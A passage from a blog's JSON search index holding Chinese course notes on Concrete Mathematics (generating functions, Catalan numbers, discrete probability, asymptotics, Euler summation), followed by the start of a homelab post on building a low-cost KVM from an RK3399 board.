\u6216\\(&lt;g_{n-m}&gt;\\)</li> <li>\\(&lt;g_{n+m}&gt;\\)</li> <li>\\(&lt;ng_n&gt;\\)\uff0c\u6c42\u5bfc\uff0c\\(zG'(z)\\)</li> <li>\\(n^2 g_n\\)?</li> <li>\\(&lt;\\frac{1}{n}g_n&gt;\\)\uff0c\u6c42\u79ef\u5206</li> <li>\u5377\u79ef\uff1a\\(F(z)G(z) = \\sum_n(\\sum_k g_k f_{n-k})z^n\\)</li> </ul> </li> <li>\u751f\u6210\u51fd\u6570\u6c42\u6590\u6ce2\u90a3\u5951\u6570\u5217</li> <li>\\(f_0=0,f_1=1, f_n = f_{n-1} +f_{n-2}, n\\ge 1\\)</li> <li>\\(f_n = f_{n-1} +f_{n-2} + [n=1], n\\in Z\\)</li> <li>\\(G(z) = \\frac{z}{1-z-z^2} = \\frac{1}{\\sqrt{5}}(\\frac{1}{1-\\alpha z} - \\frac{1}{1-\\beta z})\\)</li> <li>\u6d89\u53ca\u5230\u6709\u7406\u51fd\u6570\u5206\u89e3</li> <li>7.3 \u89e3\u9012\u63a8\u5f0f</li> <li>\u6709\u7406\u51fd\u6570\u5206\u89e3</li> <li>\u76f8\u4e92\u9012\u63a8\u6570\u5217 -&gt; \u4e8c\u5143\u4e00\u6b21\u65b9\u7a0b\u7ec4</li> <li>\\(g_0 = 1, g_n = ng_{n-1}, n\\ge 1\\)<ul> <li>\\(G(z) = z^2G'(z) + zG(z) + 1\\)</li> <li>\u8d85\u51e0\u4f55\u7ea7\u6570\uff0c\u662f\u6ee1\u8db3xxxx\uff0c\u4e14\u662f\u552f\u4e00\u6ee1\u8db3\u8be5\u65b9\u7a0b\u4e14\u5e38\u6570\u9879\u4e3a1\u7684\u5e42\u7ea7\u6570\u3002</li> </ul> </li> <li>\u4e8c\u91cd\u6c42\u548c<ul> <li>\\(f_n = f_{n-1} + \\sum_{k&lt;n}f_k + 1\\)</li> </ul> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6709\u7406\u51fd\u6570\u5206\u89e3","title":"\u6709\u7406\u51fd\u6570\u5206\u89e3","text":"<ul> <li> <p>\u7279\u6b8a\u7684\u751f\u6210\u51fd\u6570</p> </li> <li> <p>aa     </p> </li> <li> <p>\u5377\u79ef</p> </li> <li> <p>bb     </p> </li> <li> <p>aa     </p> </li> <li> <p>\u751f\u6210\u51fd\u6570\u89e3\u751f\u6210\u6811\u95ee\u9898</p> </li> <li>\u5361\u5854\u5170\u6570</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5361\u5854\u5170\u6570","title":"\u5361\u5854\u5170\u6570","text":"<p>\u8bc1\u660e1\uff1a</p> <ul> <li>ranny\u5f15\u7406</li> </ul> <p>&lt;\\(x_1, x_2, ..., x_n\\)&gt;\u548c\u4e3a1\u7684\u6574\u6570\u6570\u5217\uff0c\u5219\u53ea\u6709\u4e00\u4e2a\u5faa\u73af\u79fb\u4f4d\u6ee1\u8db3\u6240\u6709\u524d\u90e8\u5206\u548c\u4e3a\u6b63\u3002</p> <ul> <li>\u95ee\u9898\uff1a\u4ece0\u8d70\u5230n\u7684\u8d70\u6cd5</li> </ul> <p></p> <ul> <li> <p>\u8f6c\u6362\u4e3a\uff1a</p> </li> <li> <p>&lt;\\(x_1, x_2, ..., x_{2n}\\)&gt;, \\(x_i = \\pm 1\\)</p> </li> <li>\\(\\sum x_i = 0\\)</li> <li>\u90e8\u5206\u548c\u975e\u8d1f</li> <li>\u6784\u9020</li> <li></li> </ul> <p>\u8bc1\u660e2\uff1a</p> <p>\u4ece0\u5230n\uff0c\u9700\u8981n\u6b21\u53f3\u4e0a\uff0cn\u6b21\u53f3\u4e0b\u79fb\u52a8\uff0c\u6709\\({2n \\choose n}\\)\u79cd\u8d70\u6cd5\uff0c\u51cf\u53bb\u5176\u4e2d\u51fa\u73b0\u90e8\u5206\u548c\u4e3a\u8d1f\u7684\u60c5\u5f62</p> <p>\u90e8\u5206\u548c\u4e3a\u8d1f\u7684\u60c5\u5f62\uff0c\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u53cd\u5c04\u7684\u8d70\u6cd5\uff0c\\({2n \\choose n-1}\\)</p> <p>\\(C_n = {2n \\choose n} - {2n \\choose n-1}\\)</p> <p>\u8bc1\u660e3\uff1a</p> <p>\u5f15\u7406\uff1a\\(C_k^{(t, 1)} = (\\sum_{k_1 + k_2 +...k_t = k-1}C_{k_1}^{(t,1)}...) + [k=0]\\) </p> <p>\u5176\u4e2d\\(C_k^{(t, r)} = {tk + r \\choose k} \\frac{r}{tk + r}\\)</p> <p>\u8bc1\u660e</p> <p>\u8003\u8651\u75311\u548c(1-m)\u6784\u6210\u7684\u90e8\u5206\u548c\u4e3a\u6b63\u7684\uff0c\u603b\u548c\u4e3a1\u7684\u6570\u5217\uff0c\u79f0\u4e3am-Ranmy\u6570\u5217</p> <p>\u8003\u8651\u957f\u5ea6\u4e3amn+1\u7684m-Ranny\u6570\u5217\u6709\u591a\u5c11\u4e2a\uff1f</p> <p>n\u4e2a1-m, L\u4e2a1\uff0c\u5219\u957f\u5ea6n+L = nm + 1</p> <p>\u53ef\u8bf4\u660e\uff08\u5229\u7528Ranny\u5b9a\u7406\uff09</p> <p>\u4e2a\u6570=\\({nm + 1 \\choose n}\\frac{1}{nm+1} = C_n^{(m, 1)}\\)</p> <p>\u7531\u5f15\u7406\uff0c\u6709\uff1a</p> <p>G(z)\u4e3a\\(&lt;C_n^{(m, 1)}&gt;\\)\u7684\u751f\u6210\u51fd\u6570</p> <p>\\(G(z) = zG(z)^m  +1\\)</p> <ul> <li>ranny\u5f15\u7406\u63a8\u5e7f</li> </ul> <p>\\(x_1, x_2, ..., x_m\\)\u5e8f\u5217\u548c\u4e3ar\uff0c\u5219\u5176m\u4e2a\u5faa\u73af\u79fb\u4f4d\u4e2d\u6709r\u4e2a\u6ee1\u8db3\u90e8\u5206\u548c\u4e3a\u6b63\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6307\u6570\u751f\u6210\u51fd\u6570","title":"\u6307\u6570\u751f\u6210\u51fd\u6570","text":"<ul> <li>\u8fd0\u7b97</li> <li>\u6c42\u5bfc\uff1a\u5411\u5de6\u79fb</li> <li>\u79ef\u5206\uff1a\u5411\u53f3\u79fb</li> <li>\u4e58\u79ef</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#8-\u79bb\u6563\u6982\u7387","title":"8 \u79bb\u6563\u6982\u7387","text":"<ul> <li>\u6982\u7387\u7a7a\u95f4(probability space)</li> <li>\u57fa\u672c\u4e8b\u4ef6(elementary event) \\(\\omega \\in \\Omega\\)</li> <li>\u8d4b\u4e88\u57fa\u672c\u4e8b\u4ef6\u4e00\u4e2a\u6982\u7387\\(Pr(\\omega)\\)\uff0c\u6ee1\u8db3\u975e\u8d1f\uff0c\u548c\u4e3a1</li> <li>\u6982\u7387\u5206\u5e03(probability distribution)</li> <li>\u4e8b\u4ef6(event)A\u662f\u6982\u7387\u7a7a\u95f4\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u6982\u7387\u5b9a\u4e49\u4e3a\u57fa\u672c\u4e8b\u4ef6\u6982\u7387\u4e4b\u548c</li> <li>\u968f\u673a\u53d8\u91cf\uff08random variable\uff09\uff0c\u662f\u5b9a\u4e49\u5728\u6982\u7387\u7a7a\u95f4\u7684\u57fa\u672c\u4e8b\u4ef6\\(\\omega\\)\u4e0a\u7684\u51fd\u6570\u3002\u6bd4\u5982\u9ab0\u5b50\u70b9\u6570\u4e4b\u548c\u3002</li> <li>\\(X: \\Omega \\to set of value\\)</li> <li>\u968f\u673a\u53d8\u91cf\u4f7f\u5f97\u6211\u4eec\u4e0d\u7528\u7814\u7a76\u6574\u4e2a\u6982\u7387\u7a7a\u95f4\uff0c\u800c\u53ea\u7528\u7814\u7a76\u6211\u4eec\u5173\u5fc3\u7684\u91cf\u3002</li> <li>\u72ec\u7acb(independent)</li> <li>\u4e8b\u4ef6\u72ec\u7acb\uff1f</li> <li>\u968f\u673a\u53d8\u91cf\u72ec\u7acb\uff1a\\(P(X=x, Y = y) = P(X=x) P(Y= y)\\)</li> <li>\u5747\u503c\uff0c\u671f\u671b\u503c(expected value)\uff1a\\(EX = \\sum_{\\omega}X(\\omega)Pr(\\omega) = \\sum_{x \\in X(\\omega)}xPr(X=x)\\)</li> <li>\u4e2d\u4f4d\u6570\uff1a\\(P(X\\le x)\\ge 1/2\\)\u4e14\\(P(X\\ge x) \\ge 1/2\\)</li> <li> <p>\u4f17\u6570\uff1a\\(P(X=x) \\ge P(X=x'), \\forall x' \\in X(\\Omega)\\)</p> </li> <li> <p>\u671f\u671b</p> </li> <li> <p>\u53ef\u52a0\uff08\u5b9a\u4e49\u5728\u540c\u4e00\u4e2a\u6982\u7387\u7a7a\u95f4\u4e0a\uff0c\u6216\u72ec\u7acb\uff09:\\(E(X+Y) = \\sum_{\\omega} (X(\\omega) + Y(\\omega))P(\\omega) = EX + EY\\)</p> </li> <li> <p>\u4e58\u79ef\uff08\u72ec\u7acb\uff09\uff1a     $$     \\begin{aligned}     &amp;\\mathrm{E}(X Y)=\\sum_{\\omega \\in \\Omega} X(\\omega) Y(\\omega) \\cdot \\operatorname{Pr}(\\omega)\\     &amp;=\\sum_{\\substack{x \\in X(\\Omega) \\ y \\in Y(\\Omega)}} x y \\cdot \\operatorname{Pr}(X=x \\text { \u4e14 } Y=y)\\     &amp;=\\sum_{\\substack{x \\in X(\\Omega) \\ y \\in Y(\\Omega)}} x y \\cdot \\operatorname{Pr}(X=x) \\operatorname{Pr}(Y=y)     \\end{aligned}     $$</p> </li> <li> <p>\u65b9\u5dee\uff1a\\(DX = E(X^2) - (EX)^2\\)</p> </li> <li> <p>\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff1a\\(Pr((X-EX)^2 \\ge \\alpha)\\le \\frac{Var(X)}{\\alpha}\\)</p> </li> <li> <p>\\(\\operatorname{Pr}(|X-\\mu| \\geqslant c \\sigma) \\leqslant 1 / c^{2}\\)</p> </li> <li> <p>Markov\u4e0d\u7b49\u5f0f\uff1a\\(X\\ge 0, \\lambda&gt;0\\)\uff0c\u6709\\(Pr(X\\ge\\lambda) \\le \\frac{EX}{\\lambda}\\)</p> </li> <li> <p>\u76f4\u63a5\u5bfc\u51fa\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f</p> </li> <li> <p>\u8fd8\u6709\uff1a\\(Pr(f(X)\\ge f(\\lambda)) \\le \\frac{Ef(X)}{f(\\lambda)}\\), f(x) &gt; 0\uff0c\u5355\u8c03\u589e\u3002</p> </li> <li> <p>\u7528\u6837\u672c\u4f30\u8ba1\u671f\u671b\uff0c\u65b9\u5dee</p> </li> <li> <p>\\(\\hat{E} = \\frac{1}{n}\\sum_{k}X_k\\)</p> </li> <li> <p>\\(\\hat{V} = \\frac{1}{n-1}\\sum_k (X_k - \\hat{E})^2 = \\frac{1}{n-1} \\sum_k X_k^2 - \\frac{1}{n(n-1)}(\\sum_k E_k)^2\\)</p> <ul> <li>\u56e0\u4e3a\\(E\\hat{V} = DX\\)</li> </ul> </li> <li> <p>\u8003\u8651\u7b2c5\u7ae0\u7684\u201c\u8db3\u7403\u80dc\u5229\u95ee\u9898\u201d\uff0c\u5728\u8be5\u95ee\u9898\u4e2d\u6709 n \u9876\u5e3d\u5b50\u88ab\u629b\u5411\u7a7a\u4e2d\uff0c\u6709k\u4e2a\u4eba\u5f97\u5230\u81ea\u5df1\u7684\u5e3d\u5b50\u3002</p> </li> <li>\u53ef\u4ee5\u5728\u4e0d\u8ba1\u7b97\u6982\u7387\u5206\u5e03\u7684\u60c5\u51b5\u4e0b\uff0c\u8ba1\u7b97\u5747\u503c\u548c\u65b9\u5dee</li> <li>\\(F_n = F_{n,1}+F_{n,2}+\\dots + F_{n,n}\\)\uff0c\\(F_{n, k}\\)\u8868\u793a\u7b2ck\u4e2a\u4eba\u662f\u5426\u62ff\u5230\u81ea\u5df1\u5e3d\u5b50</li> <li>\\(EF_{n,k} = 1/n\\), \\(EF_n = 1\\)</li> <li>$EF_n^2 = $</li> </ul> <p>\u6982\u7387\u751f\u6210\u51fd\u6570</p> <ul> <li> <p>pgf\u4e58\u79ef\u5bf9\u5e94\u968f\u673a\u53d8\u91cf\u548c\u7684\u5206\u5e03</p> </li> <li> <p>\u7d2f\u79ef\u91cf\uff08cumulant\uff09</p> </li> <li> <p>\u7d2f\u79ef\u91cf\u72ec\u7acb\u53ef\u52a0</p> </li> <li> <p></p> </li> <li> <p>m \u9636\u77e9\uff08 m th moment\uff09</p> </li> </ul> <p></p> <p></p> <ul> <li>\u201c\u9636\u4e58\u77e9\u201d\uff0c\uff08\\(\\alpha_m = G^{(m)}(1)\\)</li> </ul> <p></p> <p></p> <p>\u629b\u786c\u5e01</p> <ul> <li> <p>\u4e8c\u9879\u5206\u5e03</p> </li> <li> <p>\u8d1f\u4e8c\u9879\u5206\u5e03\uff08\u548c\u5e15\u65af\u5361\u5206\u5e03\u7c7b\u4f3c\uff09\uff1a\u629b\u51fan\u6b21\u6b63\u9762\u65f6\uff0c\u53cd\u9762\u7684\u6b21\u6570</p> </li> <li> <p>\u5012\u6570\u751f\u6210\u51fd\u6570\uff0c\u65b9\u4fbf\u8ba1\u7b97\u65b9\u5dee</p> </li> <li> <p>\u6709\u9650\u72b6\u6001\u673a</p> </li> <li> <p>\u9a6c\u5c14\u53ef\u592b\u8fc7\u7a0b</p> </li> </ul> <p>\u72b6\u6001\u95f4\u8f6c\u79fb\u90fd\u5f15\u5bfc\u51fa\u4e00\u7ec4\u8054\u7acb\u7ebf\u6027\u65b9\u7a0b\uff0c\u5b83\u4eec\u7684\u89e3\u5c31\u662f\u5728\u51fa\u73b0 n \u6b21\u8f6c\u79fb\u4e4b\u540e\u72b6\u6001\u6982\u7387\u7684\u751f\u6210\u51fd   \u6570\uff0e\u8fd9\u79cd\u7cfb\u7edf\u79f0\u4e3a\u9a6c\u5c14\u53ef\u592b\u8fc7\u7a0b</p> <ul> <li>\u8003\u8651\u4e0d\u51fa\u73b0\u6a21\u5f0f\u7684\u7684\u548c\u5f0f</li> </ul> <p>\\(1 + N(H + T) = N + S\\)</p> <p>\u5176\u4e2d\u76841\u8003\u8651\u4e86\u4e00\u6b21\u4e0d\u629b\u7684\u60c5\u51b5\u3002\u5373N = 1 + H + T + ... \u3002\u5982\u679c\u4e0d\u8003\u8651\u8fd9\u79cd\u60c5\u51b5\uff0c\u5219</p> <p>\\(H + T + N(H + T) = N + S\\)</p> <ul> <li>\u516c\u5f0f(8.73)</li> </ul> <p>\\(NA = S(1 + A^{(1)}[A^{(1)}=A_{(1)}] + A^{(2)}[A^{(2)}=A_{(2)}] + ...)\\)</p> <ul> <li> <p>\u516c\u5f0f(8.74) (8.75)\u76f4\u63a5\u8ba1\u7b97\u671f\u671b\u4e0e\u65b9\u5dee</p> </li> <li> <p>\u81ea\u6211\u4e0d\u91cd\u53e0\u7684\u6a21\u5f0f\u8981\u6bd4\u81ea\u6211\u6709\u91cd\u53e0\u7684\u6a21\u5f0f\u51fa\u73b0\u5f97\u66f4\u65e9</p> </li> <li> <p>Penney\u8d4c\u6ce8\u6e38\u620f</p> </li> <li> <p></p> </li> <li> <p>\u5e26\u5165H= T + 1/2\uff0c\u53ef\u76f4\u63a5\u5f97\\(S_A = 2/3, S_B = 1/3\\)</p> </li> <li> <p>\u6f02\u4eae\u7684\u516c\u5f0f</p> <p></p> </li> <li> <p>\u6563\u5217\uff08\u6ca1\u8bb2\uff09</p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#9-\u6e10\u8fdb\u5f0f","title":"9 \u6e10\u8fdb\u5f0f","text":"<ul> <li>\u6e10\u8fdb</li> </ul> <ul> <li>\u91cf\u7684\u7b49\u7ea7</li> </ul> <p>\u5927O\u8bb0\u53f7</p> <ul> <li>\\(f(n) = O(g(n)) \\(\uff0c\u5219\u5b58\u5728\u5e38\u6570\\)C\\)</li> </ul> <p>\\(|f(n)| \\le C|g(n)|, n\\ge n_0\\)</p> <ul> <li>\u5355\u5411\u7b49\u53f7\uff1a\u7b49\u4e8e\u53f7\u5b9e\u9645\u4e0a\u8868\u793a\u96c6\u5408\u5305\u542b\u4e8e</li> </ul> <p>O\u8fd0\u7b97\u89c4\u5219</p> <ul> <li> <p>\\(O(O(f)) = O(f)\\)</p> </li> <li> <p>\\(O(f)O(g) = O(fg) = fO(g)\\)</p> </li> <li> <p>\u5e42\u7ea7\u6570\u622a\u65ad\u539f\u7406\uff08\u53ea\u9700\u8981S(z)\u5bf9\u67d0\u4e2a\u975e0 z\u7edd\u5bf9\u6536\u655b\uff09</p> </li> </ul> <p></p> <p>\u72c4\u5229\u514b\u96f7\u7ea7\u6570\u622a\u65ad</p> <p></p> <p>\u5e94\u7528</p> <p></p> <ul> <li> <p>\u622a\u65ad\u53d1\u6563\u7ea7\u6570\u6240\u5f97\u5230\u7684\u8fd1\u4f3c\u516c\u5f0f\u662f\u6709\u7528\u7684</p> </li> <li> <p>\u88689-1</p> </li> </ul> <p></p> <ul> <li> <p>\u5bf9\u4e8e</p> <p>\\(\\sqrt{x+1} = 1 + 1/2x -1/8x^2 + 1/16x^3 + O(x^4)\\)</p> </li> <li> <p>\u7edd\u5bf9\u8bef\u5dee\uff0c\u76f8\u5bf9\u8bef\u5dee</p> </li> </ul> <p>\\(f + O(g)\\), \\(f(1+O(g))\\)</p> <ul> <li>\u7edd\u5bf9\u8bef\u5dee\u4e0e\u5c0f\u6570\u70b9\u53f3\u8fb9\u6b63\u786e\u7684\u5341\u8fdb\u5236\u6570\u5b57\u7684\u4e2a\u6570\u6709\u5173\uff0c\u800c\u76f8\u5bf9\u8bef\u5dee\u5219\u5bf9\u5e94\u4e8e\u6b63\u786e\u7684\u201c\u6709\u6548\u6570\u5b57\u201d\u7684\u4e2a\u6570</li> <li>\u65af\u7279\u6797\u516c\u5f0f\u7684\u7edd\u5bf9\u8bef\u5dee\u4e3a\\(O(n^{n-3.5}e^n)\\)</li> <li> <p>\u76f8\u5bf9\u8bef\u5dee\u5f62\u5f0f\u4e3a</p> </li> <li> <p></p> </li> <li> <p></p> </li> <li> <p>\u62bd\u51fa\u6700\u5927\u7684\u90e8\u5206</p> </li> <li> <p>\u95ee\u98982\uff1a\u65af\u7279\u6797\u516c\u5f0f\u7684\u6270\u52a8\u6cd5</p> </li> </ul> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>\u95ee\u98983\uff1a\u7b2cn\u4e2a\u7d20\u6570</li> </ul> <p></p> <p></p> <p>\uff089.44\uff09</p> <p></p> <p>(9.45)</p> <p></p> <p>\u63a5\u4e0b\u6765\u53bb\u9664(9.45)\u53f3\u4fa7\u7684p\uff0c\u5229\u7528\\(p = O(n^2)\\)</p> <p></p> <p>\u518d\u7531(9.45)</p> <p></p> <p>\u5e26\u5165(9.44)</p> <p></p> <ul> <li>\u95ee\u98984\uff1a\u4ee5\u524d\u671f\u672b\u8003\u8bd5\u4e2d\u7684\u548c\u5f0f</li> </ul> <p></p> <p>\u65b9\u5f0f\u4e00\uff1a</p> <p></p> <p>\u65b9\u5f0f\u4e8c\uff1a</p> <p></p> <ul> <li>\u95ee\u98985\uff1a\u65e0\u9650\u548c\u5f0f</li> </ul> <p></p> <p>\u7cbe\u5999\u7684\u8f6c\u6362</p> <p></p> <p>\u5206\u7ec4</p> <p></p> <p></p> <p></p> <p></p> <p>\u53ef\u4ee5\u622a\u65ad</p> <p></p> <ul> <li>\u95ee\u98986\uff1a\u5927 \\(\\Phi\\)</li> </ul> <p></p> <p></p> <p>\u8ba1\u7b97\u65f6\uff0c</p> <p></p> <p>\u65b0\u52a0\u7684\u9879</p> <p></p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e24\u4e2a\u6e10\u8fdb\u6280\u5de7","title":"\u4e24\u4e2a\u6e10\u8fdb\u6280\u5de7","text":"<ul> <li> <p>\u81ea\u52a9\u6cd5</p> </li> <li> <p>\u751f\u6210\u51fd\u6570\u6c42\u5bfc\uff0c\u5f97\u5230\u9012\u63a8\u5f0f</p> <p></p> <p></p> <p></p> </li> <li> <p>\u4e00\u4e2a\u4e0d\u7b49\u5f0f</p> </li> </ul> <p></p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9\u6c42\u548c\u516c\u5f0f","title":"\u6b27\u62c9\u6c42\u548c\u516c\u5f0f","text":"<ul> <li> <p>\u5f62\u5f0f\u4e0a\u7684\u8bc1\u660e</p> </li> </ul> <p>\\(\\Delta = e^D - 1\\)</p> <p>\\(\\Sigma = \\frac{1}{\\Delta} = \\frac{1}{e^D - 1} = \\frac{1}{D} \\hat{B}(D)\\)</p> <p></p> <ul> <li> <p>\u5f52\u7eb3\u6cd5\u8bc1\u660e</p> </li> <li> <p>\u53ea\u9700\u8bc1\u660ea=0, b= 1\u65f6\u6210\u7acb</p> <p></p> <ul> <li>\u5219L\u65f6\uff0c\u6709</li> </ul> <p></p> </li> <li> <p>\u4f2f\u52aa\u5229\u591a\u9879\u5f0f</p> <ul> <li></li> <li></li> </ul> </li> <li> <p>\u5bf9m\u8fdb\u884c\u5f52\u7eb3</p> <ul> <li>m = 0</li> </ul> <p></p> </li> <li> <p>\u4f2f\u52aa\u5229\u591a\u9879\u5f0f\u603b\u7ed3</p> </li> <li> <p>\u53ef\u4ee5\u5206\u6790\u51fa\u5355\u8c03\u6027\uff0c\u6b63\u8d1f\u6027\u4ee54\u4e3a\u5468\u671f\u3002</p> <ul> <li>0\uff0c1\u4e0a\u79ef\u5206\u4e3a0</li> <li></li> <li>\\(B_{4k+1}\\)\u7684\u79ef\u5206\u5bf9\u5e94\\(B_{4k+2}/4k+2\\)\uff0c\u53ef\u4ee5\u5206\u6790\u51fa\\(B_{4k+2}\\)\u7684\u5355\u8c03\u6027</li> <li>\u6709</li> <li></li> <li>\u4ece\u800c\\(B_{2m}\\)\u57280\uff0c1\u4e0a\u6700\u5927\u503c\u57280\u62161/2\u5904\u53d6\u5f97</li> <li></li> </ul> <p></p> </li> <li> <p>\u6b27\u62c9\u6c42\u548c\u516c\u5f0f</p> </li> <li> <p>9.78</p> </li> <li> <p></p> </li> <li> <p>\u518d\u6b21\u6539\u8fdb</p> <ul> <li>\u4f59\u9879\u5c06\u4f4d\u4e8e0\u7b2c\u4e00\u4e2a\u88ab\u629b\u5f03\u7684\u9879\u4e4b\u95f4</li> <li>\u597d\u50cf\u6709\u524d\u63d0\u6761\u4ef6</li> <li></li> <li></li> </ul> <p></p> </li> <li> <p>\u7b80\u5355\u7684\u5e38\u6570\u9879\u7248\u6b27\u62c9\u6c42\u548c\u516c\u5f0f</p> <ul> <li></li> </ul> <p></p> </li> <li> <p>\u8c03\u548c\u7ea7\u6570</p> <p></p> </li> <li> <p>\u65af\u7279\u6797\u516c\u5f0f</p> <ul> <li>\u65af\u7279\u6797\u5e38\u6570</li> <li></li> <li></li> <li></li> </ul> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u56f0\u96be\u7684\u8bc1\u660e\u9898","title":"\u56f0\u96be\u7684\u8bc1\u660e\u9898","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/","title":"\u6361\u5783\u573e-rk3399 DIY KVM","text":"<p>\u7531\u4e8e\u6211\u7684\u53f0\u5f0f\u673a\u627f\u8f7d\u4e86NAS\uff0c\u505a\u79cd\uff0cJellyfin\uff0c\u535a\u5ba2\uff0c\u6587\u4ef6\u540c\u6b65\u7b49\u529f\u80fd\uff0c\u5df2\u7136\u6210\u4e3a\u4e00\u53f0\u670d\u52a1\u5668\uff0c\u56e0\u6b64\u5176\u53ef\u9760\u6027\u975e\u5e38\u91cd\u8981\u3002\u4f46\u662f\u6211\u8fd8\u662f\u7ecf\u5386\u8fc7\u51e0\u6b21\u7531\u4e8e\u7f51\u7edc\u6545\u969c\u5bfc\u81f4\u5176\u65e0\u6cd5\u8bbf\u95ee\u7684\u60c5\u5f62\uff0c\u6b64\u65f6\u5219\u53ea\u80fd\u53bb\u5b9e\u9a8c\u5ba4\u7ef4\u62a4\u6bd4\u8f83\u9ebb\u70e6\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u4e2aIPMI\u7684\u7ba1\u7406\u529f\u80fd\uff0c\u4f7f\u5f97\u7f51\u7edc\u51fa\u6545\u969c\u60c5\u51b5\u4e0b\u4e5f\u80fd\u8fdc\u7a0b\u8bbf\u95ee\u3002</p> <p>\u800c\u5bb6\u7528PC\u4e3b\u677f\u5f88\u5c11\u6709\u652f\u6301IPMI\u529f\u80fd\u7684\uff0c\u652f\u6301\u7684\u677f\u5b50\u4e00\u822c\u90fd\u89812000\u5143\u4ee5\u4e0a\u3002\u56e0\u6b64\u9700\u8981\u4e00\u4e2a\u6210\u672c\u4f4e\u5ec9\u7684\u65b9\u6848\uff0c\u5728\u7f51\u4e0a\u641c\u7d22\u4e00\u9635\u540e\u53d1\u73b0\u786e\u5b9e\u6709\u57fa\u4e8e\u6811\u8393\u6d3eDIY\u7684\u65b9\u6848\uff0c\u5e76\u4e14\u6709\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u5f00\u6e90\u9879\u76eePI-KVM\u3002</p> <p>\u7136\u800c\u7531\u4e8e\u6811\u8393\u6d3e400-500\u6602\u8d35\u7684\u4ef7\u683c\uff0c\u4f7f\u5f97DIY\u7684\u6210\u672c\u4ecd\u7136\u5f88\u9ad8\u3002\u76f4\u5230\u6211\u770b\u5230\u4f7f\u7528\u666e\u901aarm\u677f\u5b50\u7684\u65b9\u6848\u3002\u751a\u81f3\u53ef\u4ee5\u4f7f\u752840\u5143\u7684\u7535\u89c6\u76d2\u5b50\u3002\u56e0\u6b64\u4ef7\u683c\u5b8c\u5168\u53ef\u4ee5\u4fdd\u8bc1\u5728200\u5143\u4ee5\u5185\uff0c\u6211\u89c9\u7684\u662f\u4e00\u4e2a\u53ef\u4ee5\u63a5\u53d7\u7684\u65b9\u6848\u3002</p> <p>\u6700\u540e\u6210\u672c - king3399\u5f00\u53d1\u677f\uff1a\u54b8\u9c7c120 - ms2130 USB\u91c7\u96c6\u5361\uff0c\u652f\u63011080p 60\u5e27\uff1a\u6dd8\u5b9d 60</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5f00\u53d1\u677f","title":"\u5f00\u53d1\u677f","text":"<p>RK3399\u662fRockchip\uff08\u745e\u82af\u5fae\uff09\u51fa\u7684\u4e00\u6b3eSoC\uff0c\u5728\u6b64\u57fa\u7840\u4e0a\uff0c\u8bb8\u591a\u5f00\u53d1\u677f\u5382\u5546\u8bbe\u8ba1\u4e86\u81ea\u5df1\u7684\u5f00\u53d1\u677f\u3002</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#rk3399\u786c\u4ef6\u8d44\u6e90","title":"rk3399\u786c\u4ef6\u8d44\u6e90","text":"<p>\u4e3b\u8981\u7279\u70b9 - \u7f51\u7edc\uff1a   - \u5343\u5146\u4ee5\u592a\u7f51   - \u652f\u6301wifi+\u84dd\u7259 - \u5185\u90e8\u5b58\u50a8   - BootROM(32KB)\uff1a\u652f\u6301\u4eceSPI\u3001eMMC\u3001SD/MMC\u63a5\u53e3\u542f\u52a8   - Internal SRAM(200KB)\uff1aSupport security and non-security access - \u7247\u5916\u5b58\u50a8   - \u677f\u8f7deMMC(16G)   - \u652f\u6301SD/MMC - \u4e24\u4e2aOTG usb\u63a5\u53e3 - PCIe1.0 M.2 (Bkey)   - Mini PCIe\u4e3aLTE\u6a21\u5757\u4e13\u7528\u63a5\u53e3\uff0c\u677f\u8f7dSIM\u5361\u5ea7\uff0c\u5b9e\u73b0IOT\u5e94\u7528</p> 